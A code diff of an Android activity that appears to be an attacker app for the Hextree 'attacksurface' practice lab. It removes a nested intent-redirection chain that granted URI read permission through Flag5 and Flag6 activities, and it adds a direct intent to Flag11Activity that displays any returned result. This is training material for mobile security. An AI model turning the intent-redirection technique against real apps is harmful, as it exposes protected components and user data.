@@ -17,7 +17,7 @@ import androidx.core.graphics.Insets;
 import androidx.core.view.ViewCompat;
 import androidx.core.view.WindowInsetsCompat;
 
-public class MainActivity extends AppCompatActivity {
+public class HextreeMainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -141,28 +141,30 @@ public class MainActivity extends AppCompatActivity {
         }, 500);
 */
 
+            Intent finalIntent = new Intent();
+            finalIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag11Activity"));
 
-            Intent exploitIntent = new Intent();
-            exploitIntent.putExtra("reason", "next");
-            exploitIntent.setFlags(FLAG_GRANT_READ_URI_PERMISSION);
-            exploitIntent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity"));
-
-            Intent intent2 = new Intent();
-            intent2.putExtra("return", 42);
-            intent2.putExtra("nextIntent", exploitIntent);
-
-
-            Intent FinalIntent = new Intent();
-            FinalIntent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity"));
-            FinalIntent.putExtra("android.intent.extra.INTENT", intent2);
-
-            utils.showDialog(this, FinalIntent);
-            startActivity(FinalIntent);
-            finish();
+            //utils.showDialog(this, finalIntent);
+            //startActivityForResult(finalIntent, 1);
+            utils.showDialog(this, finalIntent);
+            startActivity(finalIntent);
 
         } catch (Exception e) {
             Toast.makeText(this, "Intent failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
             e.printStackTrace();
         }
     }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1 && resultCode == -1) {
+            data.getExtras();
+            utils.showDialog(this, data);
+        }
+    }
+
+
 }
+
+
